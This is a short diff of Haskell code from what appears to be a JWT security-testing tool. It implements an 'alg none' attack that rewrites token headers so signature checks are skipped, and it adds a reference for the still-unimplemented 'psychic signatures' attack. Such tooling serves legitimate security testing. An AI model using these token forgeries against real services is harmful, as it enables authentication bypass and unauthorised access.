@@ -38,9 +38,9 @@ attacks =
 
 atk_algoNone :: Jwt -> [Jwt]
 atk_algoNone jwt =
-  -- TODO
-  -- [ Jwt { tail = BS.empty } ]
-  []
+  [ Jwt.insertHeader jwt ("alg", "none")
+  , Jwt.insertHeader jwt ("alg", "NONE")
+  ]
 
 atk_algoSwap :: Jwt -> [Jwt]
 atk_algoSwap jwt =
@@ -56,6 +56,7 @@ atk_psychicSig :: Jwt -> [Jwt]
 atk_psychicSig jwt =
   -- TODO: Psychic Signatures
   -- https://github.com/DataDog/security-labs-pocs/tree/main/proof-of-concept-exploits/jwt-null-signature-vulnerable-app
+  -- https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/
   []
 
 -- IssuedAt
